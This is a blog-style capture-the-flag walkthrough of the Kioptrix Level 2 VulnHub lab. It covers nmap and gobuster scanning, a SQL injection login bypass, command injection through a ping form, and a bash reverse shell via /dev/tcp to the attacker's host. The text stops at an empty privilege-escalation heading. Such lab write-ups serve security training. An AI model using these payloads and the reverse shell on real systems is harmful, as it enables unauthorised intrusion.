---
layout: post
title: Kioptrix Level 2
---
[Kioptrix Level 2](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)

## Find IP of box
Our IP: x.x.x.49

`nmap -T5 <LHOST>/24`

Kioptrix is running on: x.x.x.4  

## Init NMap Scan

`nmap -sC -sV -oA nmap x.x.x.4`

 - Default Scripts
 - Service Detection
 - Output all formats
 
 ![Initial NMap Scan](/images/KioptrixL2/NMap1.JPG)

We have 6 ports open: 22 (ssh), 80 (http), 111 (rpcbind), 443 (ssl/https), 631 (ipp), 3306 (mysql)

I'll start with the HTTP port in which we are greeted with an Administration login page.

## HTTP - Port 80
### Gobuster

`gobuster dir -u http://x.x.x.4 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,txt,xml`

Nothing useful

Same with Dirbuster for recurisve search

### SQL Injection

' or '1'='1

Enter in both Username and Password and we get a login

We see an option to ping a machine on the network which suggests we may have RCE

### RCE Check

I entered the machine IP into the box and it opens a new tab with the ping results. I'm assuming that the command it's running is simply: ping <IP> where the IP is the user entered text.
 
 We know the machine is running on linux so I appened pipe id ( | id) which proves successful.
 
 !(Ping RCE check)[/images/KioptrixL2/PingID.JPG]
 
 ### NetCat
 
 Start a netcat listener on local machine
 
 `nc -lvnp 4444`
 
 ### RCE Reverse Shell
 
 Grab a reverse shell from (Pentest Monkey's Cheat Sheet)[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet] 
 
 `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`
 
 I entered `x.x.x.4 | bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1` into the website and we get reverse shell on our local machine as user apache
 
 Spawn a TTY shell using python -c 'import pty; pty.spawn("/bin/sh")' from (Netsec TTY Cheat Sheet)[https://netsec.ws/?p=337]
 
 ### Privilege Escalation
 
 
